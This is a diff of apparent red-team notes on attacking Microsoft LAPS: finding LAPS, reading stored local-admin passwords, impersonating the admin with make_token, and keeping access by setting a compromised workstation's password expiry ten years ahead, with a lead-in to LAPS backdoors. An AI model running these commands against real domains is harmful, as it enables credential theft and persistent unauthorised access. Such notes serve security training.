@@ -3,6 +3,7 @@
 Tools:
 [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)
 
+## Search
 can check locally for files
 ```
 ls C:\Program Files\LAPS\CSE
@@ -30,7 +31,7 @@ Parse-PolFile .\Desktop\Registry.pol
 ```
 
 
-**Reading ms-Mcs-AdmPwd**
+## Reading ms-Mcs-AdmPwd
 Tools:
 [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
 
@@ -49,7 +50,7 @@ abuse:
 make_token .\LapsAdmin <password>
 ```
 
-**Password Expiration Protection**
+## Password Expiration Protection
 
 If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default.
 Since we were able to compromise WKSTN-1 using its LAPS password, we can set its expiration long into the future as a form of persistence.
@@ -65,15 +66,7 @@ to push out 10 years
 powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
 ```
 
-**LAPS Backdoors*
+## LAPS Backdoors
 
 This module will demonstrate this idea using the LAPS PowerShell cmdlet Get-AdmPwdPassword.  If installed on a machine, the LAPS PowerShell modules can be found under C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS
-
-
-
-
-
-
-
-
 
